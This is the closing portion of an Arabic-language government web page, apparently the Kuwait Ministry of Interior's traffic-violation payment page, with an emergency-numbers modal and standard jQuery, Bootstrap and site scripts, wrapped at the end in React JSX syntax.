        <div id="overlay" class="d-none"></div>
        <script>


            var state = true;
            function toggleFormsSideBar() {
                if (state) {
                    $("#formsSideBar").animate({
                        width: 200,
                        fontSize: 14
                    }, 500);
                } else {
                    $("#formsSideBar").animate({
                        width: 30,
                        fontSize: 0
                    }, 500);
                }
                state = !state;
            }

            var regState = true;
            function toggleRegSideBar() {
                if (regState) {
                    $("#regSideBar").animate({
                        width: 200,
                        fontSize: 14
                    }, 500);
                } else {
                    $("#regSideBar").animate({
                        width: 30,
                        fontSize: 0
                    }, 500);
                }
                regState = !regState;
            }

        </script>

        <style>

            #overlay {
                /*display:none;*/
                position: fixed; /* Sit on top of the page content */
                width: 100%; /* Full width (cover the whole page) */
                height: 100%; /* Full height (cover the whole page) */
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: rgba(0,0,0,0.7); /* rgba(0,0,0,0.5); Black background with opacity */
                /*opacity: .8;*/
                z-index: 2; /* Specify a stack order in case you're using a different order for other elements */
                cursor: pointer; /* Add a pointer on hover */
            }

            .sbToggler {
                position: absolute;
                right: -55px;
                z-index: 99;
                bottom: -5px;
                border: 0px solid red;
                /* background-image: url(/main/images/assets/esp-logo-white.svg); */
                background-size: 50px 50px;
                background-repeat: no-repeat;
                height: 70px;
                width: 70px;
                cursor: pointer;
                display: block;
            }



            .sbEffect {
                border: 1px solid #fff;
                font-size: 0px;
                width: 30px;
                height: 60px;
                left: 0;
                position: fixed;
                background: #000576;
                overflow: visible !important;
                z-index: 98;
            }

            .sbEffect1 {
                border: 1px solid #fff;
                font-size: 0px;
                width: 30px;
                height: 60px;
                left: 0;
                position: fixed;
                background: #000576;
                overflow: visible !important;
                z-index: 99;
            }

            .sbEffect a {
                color: #fff;
            }

            /*@media only screen and (max-width: 768px) {
                            [class="sbEffect1"] {
                                top: calc(100% - 250px);
                            }
                        }*/
        </style>

        <!--Slider Bottom Menu for mobile-->
        <mqa class="container bottom-slider-sm p-0 m-0 d-md-none d-lg-none d-sm-block">

        </mqa>

        <div class="container p-0 m-0" id="dqaContainer">
            <!--Slider Bottom Menu for desktop-->
            <dqa class="container p-0 m-0 d-none d-md-block bottom-slider">

            </dqa>
            <footer class="container border-top footer text-muted mt-2 p-0">
                <!--<div class="col-sm-12 text-center text-white mt-2 ">
                    <div class="row">
                        <div class="col-sm-12">
                            <a href="https://www.youtube.com/user/SecurityMediaQ8">
                                <img src="~/images/assets/social-media/ico-youtube.svg" class="social-media-icon" />
                            </a>

                            <a href="https://www.instagram.com/moi_kuw/?hl=en">
                                <img src="~/images/assets/social-media/ico-instagram.svg" class="social-media-icon" />
                            </a>
                            <a href="https://twitter.com/moi_kuw?lang=en">
                                <img src="~/images/assets/social-media/ico-twitter.svg" class="social-media-icon" />
                            </a>
                            <a href="https://www.facebook.com/MOIKuwait/">
                                <img src="~/images/assets/social-media/ico-facebook.svg" class="social-media-icon" />
                            </a>
                            &nbsp;&nbsp;
                            <a href="https://play.google.com/store/apps/details?id=com.MoIKuwait">
                                <img src="~/images/assets/common/ico-android.svg" class="social-media-icon" />
                            </a>
                            &nbsp;&nbsp;
                            <a href="https://itunes.apple.com/kw/app/moi-kuwait/id871764188?mt=8">
                                <img src="~/images/assets/common/ico-apple.svg" class="social-media-icon" />
                            </a>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-12">
                 © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت&nbsp;-&nbsp;2026
                        </div>
                    </div>
                </div>-->
            </footer>
        </div>
    </div>
    <modals></modals>

    <div class="modal fade" id="emergencyContactModal" tabindex="-1" role="dialog" aria-labelledby="emergencyContactModalTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="emergencyContactModalTitle">أرقام الطوارئ</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-12 col-md-6 text-center border-bottom">
                            الشرطة، الإسعاف و قوة الإطفاء<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            112
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom">
                            الدفاع المدني<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            1804000
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            إدارة الجرائم الإلكترونية<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-whatsapp.svg" style="height:15px;" />
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <a href="https://wa.me/+96597283939">97283939</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            إدارة العامة لحماية الأحداث<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            25589535<br />
                                            97283636 &nbsp;<img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-whatsapp.svg" style="height:15px;" />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            الإدارة العامة لمكافحة المخدرات<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            1884141
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            الإدارة العامة لخفر السواحل<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            1880888
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            الإدارة العامة للمرور<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-whatsapp.svg" style="height:15px;" />
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <a href="https://wa.me/+96599324092">99324092</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            الإدارة العامة للرقابة والتفتيش<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            25200334
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            الإدارة العامة لشؤون الإقامة<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <span class="font-weight-bolder">25582960</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <span class="font-weight-bolder">25582961</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                    <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-whatsapp.svg" style="height:15px;" />
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <a href="https://wa.me/+96597288200">97288200</a>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            <a href="https://wa.me/+96597288211">97288211</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 text-center border-bottom mt-2">
                            إدارة حماية الآداب العامة ومكافحة الإتجار بالأشخاص<br />
                            <div class="row">
                                <div class="col-4 align-self-center text-left">
                                </div>
                                <div class="col-8">
                                    <div class="row">
                                        <div class="col-12 font-weight-bold text-right">
                                            25589648<br />
                                            25589655<br />
                                            25589696
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!--

    <div class="modal fade" id="newServicesModal" tabindex="-1" role="dialog" aria-labelledby="newServicesModalTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="newServicesModalTitle"></h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-12 col-md-4 text-center">
                            <a href="https://edl.moi.gov.kw/Login.aspx">
                                <img src="~/images/assets/general-traffic/ico-renew.svg" class="moi-ico" />
                                <div class="row text-center">
                                    <div class="col">
    Renew Driving License
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="col-12 col-md-4 text-center">
                            <a href="https://esp.moi.gov.kw/MOI_Kuwait/apps/services/www/MoIKuwait/desktopbrowser/default/index.html">
                                <img src="~/images/assets/esp-logo-white.svg" class="moi-ico" />
                                <div class="row text-center d-flex">
                                    <div class="col">
    منصة الخدمات الإلكترونية
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="col-12 col-md-4 text-center">
                            <a href="https://eres.moi.gov.kw/ar/auth/login">
                                <img src="~/images/assets/residency/ico-renew.svg" class="moi-ico" />
                                <div class="row text-center">
                                    <div class="col">
    تجديد إقامة العمالة المنزلية
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="col-12 col-md-4 text-center">
                            <a asp-area="eservices" asp-controller="residence" asp-action="HealthReport">
                                <img src="~/images/assets/common/ico-health-check-status.svg" class="moi-ico" />
                                <div class="row text-center">
                                    <div class="col">
    جاهزية نتيجة الفحص الطبي
                                    </div>
                                </div>
                            </a>
                        </div>
                    </div>

                </div>
                <div class="modal-footer">
                </div>
            </div>
        </div>
    </div>


    <div class="modal fade" id="infoModal" tabindex="-1" role="dialog" aria-labelledby="infoModalTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="infoModalTitle">تعديل شركة الإتصالات</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body" id="QAResponse">
    Your company is now changed as requested.
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">إغلاق</button>
                </div>
            </div>
        </div>
    </div>
        -->


    
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" crossorigin="anonymous" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=">
        </script>
<script>(window.jQuery||document.write("\u003Cscript src=\u0022/main/lib/jquery/dist/jquery.min.js\u0022 crossorigin=\u0022anonymous\u0022 integrity=\u0022sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\u0022\u003E\u003C/script\u003E"));</script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js" crossorigin="anonymous" integrity="sha384-xrRywqdh3PHs8keKZN+8zzc5TX0GRTLCcmivcbNJWm2rs5C8PRhcEn3czEjhAO9o">
        </script>
<script>(window.jQuery && window.jQuery.fn && window.jQuery.fn.modal||document.write("\u003Cscript src=\u0022/main/lib/bootstrap/dist/js/bootstrap.bundle.min.js\u0022 crossorigin=\u0022anonymous\u0022 integrity=\u0022sha384-xrRywqdh3PHs8keKZN\u002B8zzc5TX0GRTLCcmivcbNJWm2rs5C8PRhcEn3czEjhAO9o\u0022\u003E\u003C/script\u003E"));</script>
        <script src="https://www.moi.gov.kw/main/lib/jquery-validation/dist/jquery.validate.min.js"></script>
        <script src="https://www.moi.gov.kw/main/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.min.js"></script>
        <!-- optionally if you need to use a theme, then include the theme JS file as mentioned below -->
        <!-- optionally if you need translation for your language then include locale file as mentioned below -->
        <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js"
                integrity="sha256-VazP97ZCwtekAsvgPBSUwPFKdrwD3unUfSGVYrahUqU="
                crossorigin="anonymous"></script>
        <script src="https://www.google.com/recaptcha/api.js?render=6LdUyqwUAAAAAM5MRMXHrlAjDCrWT5CcRpdXgK2p" async defer></script>
        <script src="https://www.moi.gov.kw/main/js/site.min.js?v=hVKFgwQR4FLFHd81K8gJy_gj3s0QWT-9NhbgDnnkxoI"></script>
        <script src="https://www.moi.gov.kw/main/qa/qa.min.js?v=p9LCrmcj9KdN-lfAzm9Q-jfP1cE2W97WAm9trJNZuN0"></script>

    

    <script>
        let lang='ar';
        getFooterText = () => {
            return ' © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - ' + '2026'
        }

        $(document).ready(function () {
            $('.collapse').on('shown.bs.collapse', function () {
                $(this).prev().addClass('active-acc');
            });

            $('.collapse').on('hidden.bs.collapse', function () {
                $(this).prev().removeClass('active-acc');
            });
            if ('True' == 'True') {
                $('dqa').load('/main/qa/dqa-ar.html?time=' + new Date().getTime());
                $('mqa').load('/main/qa/mqa-ar.html?time=' + new Date().getTime());
                $('modals').load('/main/qa/modals-ar.html?time=' + new Date().getTime());
                $(".container-navlinks").load("/main/nav/nav-ar.html?time=" + new Date().getTime());
            }
            else {
                //$('nav').load('/main/nav/nav-en.html');
                $('dqa').load('/main/qa/dqa-en.html?time=' + new Date().getTime());
                $('mqa').load('/main/qa/mqa-en.html?time=' + new Date().getTime());
                $('modals').load('/main/qa/modals-en.html?time=' + new Date().getTime());
                $(".container-navlinks").load("/main/nav/nav-en.html?time=" + new Date().getTime());
            }
            //$('footer').load('/main/footer.html');
        });


    </script>
    <script type="text/javascript">
        (function () {
            $("#selectLanguage select").change(function () {
                $(this).parent().submit();
            });
        }());
        $(document).ready(function () {
            /*$$('#overlay').on("click", function () {
                $('#overlay').addClass('d-none');
                //hideResPop();
                //hideFormsPop();
                //hideNewServicesPop();
                hideGetRefNumPop();
            });
            $("#formsSideBar").on("click", function () {
                toggleFormsSideBar();
            });
            $("#regSideBar").on("click", function () {
                toggleRegSideBar();
            });
            ("#sbToggler").on("click", function () {
                toggleFormsSideBar();
                $('#sbPop').popover('hide');
            });
            $("#sbPop").on("click", function () {
                //alert('clicked');
                $('#sbPop').popover('hide');
                $('#overlay').addClass('d-none');
            });*/
            
            //setAccordionDirection();
            //Add active class to the current button (highlight it)
            // var header = document.getElementById("navbarResponsive");
            // var btns = header.getElementsByClassName("nav-item");
            
            // for (var i = 0; i < btns.length; i++) {
            //     console.log(btns[i]);
            //     btns[i].addEventListener("click", function () {
            //         alert("clicked");
            //         var current = document.getElementsByClassName("nav-item active");
            //         if (current.length > 0) {
            //             current[0].className = current[0].className.replace(" active", "");
            //         }
            //         this.className += " active";
            //     });
            // }
            // if (window.location.pathname.toLowerCase().includes("/eservices")) {
            //     btns[0].className = btns[0].className.replace(" active", "");
            //     btns[1].className += " active";
            // }
            // else if (window.location.pathname.toLowerCase().includes("/sections")) {
            //     btns[0].className = btns[0].className.replace(" active", "");
            //     $('#relatedDepartmentsMenu').addClass('active');
            // }
            // else if (window.location.pathname.toLowerCase().includes("/emagazine")) {
            //     btns[0].className = btns[0].className.replace(" active", "");
            //     btns[10].className += " active";
            //     $('#navEMag').addClass('active');
            //     console.log(btns[10]);
            // }
            // else if (window.location.pathname.toLowerCase().includes("/news/archive")) {
            //     btns[0].className = btns[0].className.replace(" active", "");
            //     btns[11].className += " active";
            //     $('#navArchive').addClass('active');
            // }
            // else if (window.location.pathname.toLowerCase().includes("/home/strategy")) {
            //     btns[0].className = btns[0].className.replace(" active", "");
            //     btns[11].className += " active";
            //     $('#navStrategy').addClass('active');
            // }

            // if ('True' == 'True') {
            //     $(".container-navlinks").load("/main/nav/nav-ar.html?time=" + new Date().getTime());
            // }
            // else{
            //     $(".container-navlinks").load("/main/nav/nav-en.html?time=" + new Date().getTime());
            // }
        });
    </script>
    
    
    
        <script src="https://www.moi.gov.kw/main/js/gdt.min.js?v=MpsxTV656HSHUTy3eBjyzHudvQ5rYeMZYf4sKMqfVB0"></script>
    
    <script>
        getTextFor = key => {
            switch (key) {
                case "Civil Id":
                    return 'الرقم المدني';
                    break;
                case "Civil Id or National Number":
                    return 'الرقم المدني أو الرقم الموحد';
                case "Company Number":
                    return 'الرقم الموحد للشركة';
                    break;
                case "Total tickets":
                    return 'عدد المخالفات';
                    break;
                case "Total Amount":
                    return 'المبلغ الاجمالي';
                    break;
                case "Amount to Pay":
                    return 'Amount to Pay';
                    break;
                case "Payable":
                    return 'قابلة للدفع الكترونياً';
                    break;
                case "Non Payable":
                    return 'غير قابلة للدفع الكترونياً';
                    break;
                case "Ticket":
                    return 'رقم';
                    break;
                case "KD":
                    return 'دك';
                    break;
                case "Direct":
                    return 'مباشرة';
                    break;
                 case "InDirect":
                    return 'غير مباشرة';
                    break;
                case "Plate":
                    return 'رقم اللوحة';
                    break;
                case "Type":
                    return 'نوع المخالفة';
                    break;
                case "Place":
                    return 'موقع المخالفة';
                    break;
                case "Date":
                    return 'تاريخ المخالفة';
                    break;
                case "Info":
                    return 'وصف المخالفة';
                    break;
                case "Model":
                    return 'صنف السيارة';
                    break;
                case "Amount":
                    return 'قيمة المخالفة';
                    break;
                case "Select":
                    return 'اختار';
                    break;
                case "Remove":
                    return 'إلغاء';
                    break;
                case "Selected Amount":
                    return 'إجمالي القيمة المختارة';
                    break;
                case "Invalid entry":
                    return 'البيانات المدخلة غير صحيحة';
                    break;
                case "Required":
                    return 'حقل مطلوب';
                    break;
                case "No violations found":
                    return 'لا يوجد مخالفات';
                    break;
                case "No non-payable violations found":
                    return 'لا يوجد مخالفات';
                    break;
                case "Please check with the relevant authority":
                    return 'يرجى مراجعة الجهة المختصة';
                    break;
                case "Unable to process, please try later":
                    return 'تعذّر إكمال الإجراء، يرجى المحاولة بعد حين';
                    break;
                case "Time":
                    return 'الساعة';
                    break;
                default:
                    return key;
                    break;
            }
        }

        getLang = () => {
            return  'ar';
        }
        
        $(document).ready(function () {
            setEnquireForm();
            $('#btnPay').click(function () {
                $('#btnEnquire').attr("disabled", true);
                $('#btnPay').attr("disabled", true);
                $("#workingOnIt").removeClass('d-none');
                var selectedTickets = $('.select-ticket:checked').map(function () {
                    return this.id;
                }).get();
                initiatePaymentRequestV2(selectedTickets,"TRAFFIC VIOLATIONS");
                return;
                initiatePaymentRequest(selectedTickets,"TRAFFIC VIOLATIONS");
                return;
            });
            checkQueryString();
            $("#responseInfo").on("click", ".accordion", function (e) {
            var tktTarget = $(e.currentTarget).find('div.card-body');
            if (tktTarget.html().includes("spinner-grow")) {
                //console.log($(this).attr('id'));
                var ticketNum =parseInt($(this).attr('id').replace("accTicket", ""));
                var ticketToGetDetail = allTickets.ExportGroupViolationsList.filter(function (ticket) {
                    //console.log(ticket);
                    return ticket.ExportGrpKuwaitViolationDetails.TicketNumber === ticketNum;
                });
                var ticketWithDetail = {
                    'ticket': ticketToGetDetail[0]
                };
                //console.log(ticketToGetDetail[0]);
                showTicketDetailV2(tktTarget,ticketToGetDetail[0]);
            }
        });
        });
    </script>

</body>
</html>
` }} 
    />
  );
}
